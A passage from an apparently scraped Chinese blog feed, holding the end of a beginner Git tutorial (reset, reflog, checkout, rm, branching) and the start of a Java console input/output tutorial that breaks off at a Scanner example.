HEAD is now at b679b01 添加了一行代码打印hello linux

[root@vm1 GitTest]<span class="hljs-comment"># cat 1.py </span>
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello world"</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello python"</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello linux"</span>)
</code></pre>
<p>4, 回退到<strong>上上</strong>一个版本, 也就是回退两个版本,使用<code>git reset --hard HEAD^^</code></p>
<p>回退三个版本,使用<code>git reset --hard HEAD^^^</code>, 以此类推。</p>
<p>如果回退100个版本，那用100个^符号不方便，可以换成<code>git reset --hard HEAD~100</code></p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># git reset --hard HEAD^^</span>
HEAD <span class="hljs-keyword">is</span> now at <span class="hljs-number">4e67190</span> 提交<span class="hljs-number">1.</span>py

[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># cat 1.py </span>
print(<span class="hljs-string">"hello world"</span>)
</code></pre>
<p><strong>小结:</strong></p>
<ul>
<li>
<p>提交后的代码文件，使用<code>git log</code>查看当前版本及以前的历史版本。</p>
</li>
<li>
<p>使用<code>git reset --hard HEAD^</code>或者<code>git reset --hard HEAD~100</code>实现版本回退。</p>
</li>
<li>
<p>使用<code>git reflog</code>查看提交的所有操作及版本号</p>
</li>
<li>
<p>使用<code>git reset --hard 版本号</code>你可以自由的在不同版本之间来回切换。</p>
</li>
</ul>
<p><strong>git工作流再次理解与应用拓展</strong></p>
<ul>
<li>
<p>工作目录里任何修改或增加的文件，都要git add到暂存区，让暂存区和工作目录的状态一致，这样才能提交一个版本。</p>
</li>
<li>
<p>git commit提交的是在暂存区里的所有文件状态。<strong>==也就是说是整个工作目录里的状态保存为一个版本，而不是某一个文件==</strong>。</p>
</li>
<li>
<p>git版本控制不仅仅是用于项目开发，你也可以用于一个软件包仓库的版本控制。</p>
</li>
</ul>
<h4 data-id="heading-11">撤销修改</h4>
<p>如果开发者状态不好,今天写的代码一团乱,想吃后悔药,git也提供了撤销的方法。</p>
<p>1, 准备一行或一段写错的代码</p>
<pre><code class="hljs language-perl" lang="perl">[root@vm1 GitTest]<span class="hljs-comment"># cat 1.py </span>
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello world"</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello python"</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello linux"</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hey,xxx is a gay"</span>)				这是写错的代码，需要反悔
</code></pre>
<p>想要撤销修改有以下方法:</p>
<ul>
<li>
<p>直接把写错的代码删除就好, 但如果改变的代码很多，开发者自己都忘了具体改了哪些代码，这种做法就不方便了</p>
</li>
<li>
<p>使用<code>git checkout -- 文件名</code>就可以直接撤销修改了</p>
</li>
<li>
<p>如果写乱了代码，添加暂存区但还没有commit提交。使用<code>git reset HEAD 文件名</code>取消暂存区添加，再<code>git checkout -- 文件名</code>来撤销修改</p>
</li>
<li>
<p>如果写乱了代码，添加暂存区并提交了。则使用版本回退</p>
</li>
</ul>
<h4 data-id="heading-12">误删恢复</h4>
<p>1, 只要文件<code>git add</code>到了暂存区, 无论有没有<code>git commit</code>提交。误删除后都可以使用 <code>git checkout -- 文件名</code>来恢复。</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># touch 2.py</span>
[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># git add 2.py</span>
[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># rm 2.py  -rf</span>
[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># ls</span>
<span class="hljs-number">1.</span>py
[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># git checkout -- 2.py</span>
[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># ls</span>
<span class="hljs-number">1.</span>py  <span class="hljs-number">2.</span>py
</code></pre>
<p>2, 如果文件没有<code>git add</code>到暂存区, 误删除了就没了。</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># touch 3.py</span>
[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># rm 3.py  -rf</span>

下面命令恢复报错
[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># git checkout -- 3.py</span>
error: pathspec <span class="hljs-string">'2.py'</span> <span class="hljs-function">did <span class="hljs-keyword">not</span> match any <span class="hljs-title">file</span>(<span class="hljs-params">s</span>) known to git.
</span></code></pre>
<h4 data-id="heading-13">文件删除</h4>
<p>1, 没有<code>git add</code>到暂存区的文件<strong>直接rm删除就ok</strong></p>
<p>2, <code>git add</code>添加到暂存区,但没有<code>git commit</code>提交的文件。需要<strong>rm删除本地,还要git rm 文件名删除</strong></p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># touch 3.py</span>
[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># git add 3.py</span>

[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># rm 3.py -rf</span>
[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># git rm 3.py</span>
rm <span class="hljs-string">'3.py'</span>
</code></pre>
<p>3, <code>git add</code>添加到暂存区,并且已经<code>git commit</code>提交的文件。需要<strong>rm删除本地,再git rm 文件名删除,最后再提交删除</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-attr">[root@vm1 GitTest]</span># touch <span class="hljs-number">3</span><span class="hljs-selector-class">.py</span>
<span class="hljs-selector-attr">[root@vm1 GitTest]</span># git add <span class="hljs-number">3</span><span class="hljs-selector-class">.py</span>
<span class="hljs-selector-attr">[root@vm1 GitTest]</span># git commit -m "提交了<span class="hljs-number">3</span><span class="hljs-selector-class">.py</span>"
<span class="hljs-selector-attr">[master 0236aef]</span> 提交了<span class="hljs-number">3</span><span class="hljs-selector-class">.py</span>
 <span class="hljs-number">1</span> file changed, <span class="hljs-number">0</span> <span class="hljs-built_in">insertions</span>(+), <span class="hljs-number">0</span> <span class="hljs-built_in">deletions</span>(-)
 create mode <span class="hljs-number">100644</span> <span class="hljs-number">3</span><span class="hljs-selector-class">.py</span>


<span class="hljs-selector-attr">[root@vm1 GitTest]</span># rm <span class="hljs-number">3</span><span class="hljs-selector-class">.py</span> -rf
<span class="hljs-selector-attr">[root@vm1 GitTest]</span># git rm <span class="hljs-number">3</span><span class="hljs-selector-class">.py</span>
rm '<span class="hljs-number">3</span><span class="hljs-selector-class">.py</span>'
<span class="hljs-selector-attr">[root@vm1 GitTest]</span># git commit -m "删除了<span class="hljs-number">3</span><span class="hljs-selector-class">.py</span>"
<span class="hljs-selector-attr">[master dc4ee5e]</span> 删除了<span class="hljs-number">3</span><span class="hljs-selector-class">.py</span>
 <span class="hljs-number">1</span> file changed, <span class="hljs-number">0</span> <span class="hljs-built_in">insertions</span>(+), <span class="hljs-number">0</span> <span class="hljs-built_in">deletions</span>(-)
 delete mode <span class="hljs-number">100644</span> <span class="hljs-number">3</span><span class="hljs-selector-class">.py</span>
</code></pre>
<h3 data-id="heading-14">Git 分支管理</h3>
<p>核心目标：隔离开发、避免冲突，开发完成后合并主分支。</p>
<h4 data-id="heading-15">1. 查看分支</h4>
<pre><code class="hljs">git branch
</code></pre>
<ul>
<li>带 <code>*</code> 的是当前分支，默认只有 <code>master</code>（或 <code>main</code>）。</li>
</ul>
<h4 data-id="heading-16">2. 创建分支</h4>
<pre><code class="hljs language-bash" lang="bash">git branch 分支名  <span class="hljs-comment"># 例：git branch dev（创建开发分支）</span>
</code></pre>
<h4 data-id="heading-17">3. 切换分支</h4>
<pre><code class="hljs language-bash" lang="bash">git checkout 分支名  <span class="hljs-comment"># 例：git checkout dev</span>
<span class="hljs-comment"># 快捷创建+切换（推荐）</span>
git checkout -b 分支名  <span class="hljs-comment"># 例：git checkout -b dev</span>
</code></pre>
<h4 data-id="heading-18">4. 合并分支（主分支合并开发分支）</h4>
<ol>
<li>
<p>先切回主分支：</p>
<p>git checkout master  # 或 main</p>
</li>
<li>
<p>合并目标分支（如 dev）：</p>
<p>git merge dev</p>
</li>
</ol>
<h4 data-id="heading-19">5. 删除分支（开发完成后）</h4>
<pre><code class="hljs language-bash" lang="bash">git branch -d 分支名  <span class="hljs-comment"># 例：git branch -d dev</span>
</code></pre>
<ul>
<li>注意：不能删除当前所在分支。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java输入输出：让程序能与世界“对话”]]></title>    <link>https://juejin.cn/post/7579659550861803562</link>    <guid>https://juejin.cn/post/7579659550861803562</guid>    <pubDate>2025-12-04T08:40:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579659550861803562" data-draft-id="7579659550861770794" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java输入输出：让程序能与世界“对话”"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-04T08:40:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="吃西红柿长大的番茄"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java输入输出：让程序能与世界“对话”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    吃西红柿长大的番茄
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:40:10.000Z" title="Thu Dec 04 2025 08:40:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-light">.hljs-comment,.hljs-quote{color:#696969}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d91e18}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#aa5d00}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:green}.hljs-section,.hljs-title{color:#007faa}.hljs-keyword,.hljs-selector-tag{color:#7928a1}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fefefe;color:#545454}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">1.控制台输入输出：最基本的对话方式</h2>
<h3 data-id="heading-1">1.1 System.out：程序的"嘴巴"</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConsoleOutput</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 控制台输出 ==="</span>);
        
        <span class="hljs-comment">// 1. System.out.println() - 输出后换行</span>
        System.out.println(<span class="hljs-string">"大家好！"</span>);  <span class="hljs-comment">// 输出后自动换行</span>
        System.out.println(<span class="hljs-string">"我是Java程序。"</span>);
        
        <span class="hljs-comment">// 2. System.out.print() - 输出后不换行</span>
        System.out.print(<span class="hljs-string">"今天是"</span>);
        System.out.print(<span class="hljs-string">"美好的一天！"</span>);  <span class="hljs-comment">// 这两行会连在一起</span>
        System.out.println();  <span class="hljs-comment">// 手动换行</span>
        
        <span class="hljs-comment">// 3. System.out.printf() - 格式化输出（最强大！）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"张三"</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
        <span class="hljs-type">double</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> <span class="hljs-number">95.5</span>;
        
        System.out.printf(<span class="hljs-string">"姓名: %s, 年龄: %d, 成绩: %.2f\n"</span>, name, age, score);
        
        <span class="hljs-comment">// 更多格式化示例</span>
        System.out.printf(<span class="hljs-string">"圆周率: %.3f\n"</span>, <span class="hljs-number">3.1415926</span>);   <span class="hljs-comment">// 保留3位小数</span>
        System.out.printf(<span class="hljs-string">"百分比: %.1f%%\n"</span>, <span class="hljs-number">85.5</span>);      <span class="hljs-comment">// 显示百分号</span>
        System.out.printf(<span class="hljs-string">"学号: %05d\n"</span>, <span class="hljs-number">123</span>);           <span class="hljs-comment">// 5位数字，不足补0</span>
        System.out.printf(<span class="hljs-string">"价格: %,.2f元\n"</span>, <span class="hljs-number">1234567.89</span>); <span class="hljs-comment">// 千位分隔符</span>
        
        <span class="hljs-comment">// 4. 输出特殊字符</span>
        System.out.println(<span class="hljs-string">"特殊字符："</span>);
        System.out.println(<span class="hljs-string">"换行：第一行\n第二行"</span>);      <span class="hljs-comment">// \n 换行</span>
        System.out.println(<span class="hljs-string">"制表符：A\tB\tC"</span>);          <span class="hljs-comment">// \t 制表符</span>
        System.out.println(<span class="hljs-string">"反斜杠：\\"</span>);               <span class="hljs-comment">// \\ 反斜杠</span>
        System.out.println(<span class="hljs-string">"双引号：\"你好\""</span>);         <span class="hljs-comment">// \" 双引号</span>
        System.out.println(<span class="hljs-string">"单引号：\'Java\'"</span>);         <span class="hljs-comment">// \' 单引号</span>
        
        <span class="hljs-comment">// 5. 输出各种数据类型</span>
        System.out.println(<span class="hljs-string">"\n各种数据类型输出："</span>);
        System.out.println(<span class="hljs-string">"布尔值："</span> + <span class="hljs-literal">true</span>);
        System.out.println(<span class="hljs-string">"整数："</span> + <span class="hljs-number">100</span>);
        System.out.println(<span class="hljs-string">"小数："</span> + <span class="hljs-number">3.14</span>);
        System.out.println(<span class="hljs-string">"字符："</span> + <span class="hljs-string">'A'</span>);
        System.out.println(<span class="hljs-string">"字符串："</span> + <span class="hljs-string">"Hello"</span>);
        
        <span class="hljs-comment">// 6. 组合输出</span>
        System.out.println(<span class="hljs-string">"\n=== 学生信息卡 ==="</span>);
        System.out.println(<span class="hljs-string">"姓名：李四"</span>);
        System.out.println(<span class="hljs-string">"年龄：22岁"</span>);
        System.out.println(<span class="hljs-string">"专业：计算机科学"</span>);
        System.out.println(<span class="hljs-string">"成绩：A+"</span>);
        System.out.println(<span class="hljs-string">"==================="</span>);
    }
}
</code></pre>
<h3 data-id="heading-2">1.2 Scanner：程序的"耳朵"</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">import</span> java.util.Scanner;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConsoleInput</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 控制台输入 ==="</span>);
        
        <span class="hljs-comment">// 创建Scanner对象（System.in表示从键盘输入）</span>
